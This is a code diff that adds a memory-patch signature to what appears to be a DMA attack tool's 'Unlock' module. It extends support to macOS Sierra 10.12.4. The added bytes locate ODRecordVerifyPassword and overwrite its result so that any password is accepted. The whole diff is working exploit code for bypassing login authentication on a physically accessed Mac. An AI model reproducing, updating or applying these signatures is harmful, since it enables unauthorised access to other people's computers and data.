@@ -48,7 +48,7 @@ BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPage, PSIGNATURE pSignatures, DWOR
 	return result;
 }
 
-#define NUMBER_OF_SIGNATURES 3
+#define NUMBER_OF_SIGNATURES 4
 STATUS Unlock(PKMDDATA pk)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -65,6 +65,11 @@ STATUS Unlock(PKMDDATA pk)
 		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (Sierra 10.12.3)
 			{ .cbOffset = 0x130,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
 			{ .cbOffset = 0x138,.cb = 8,.pb = { 0x3e, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
+			{ .cbOffset = 0x140,.cb = 2,.pb = { 0xb0, 0x01 } } }
+		},
+		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (Sierra 10.12.4)
+			{ .cbOffset = 0x130,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
+			{ .cbOffset = 0x138,.cb = 8,.pb = { 0x1a, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
 			{ .cbOffset = 0x140,.cb = 2,.pb = { 0xb0, 0x01 } } }
 		},
 	};
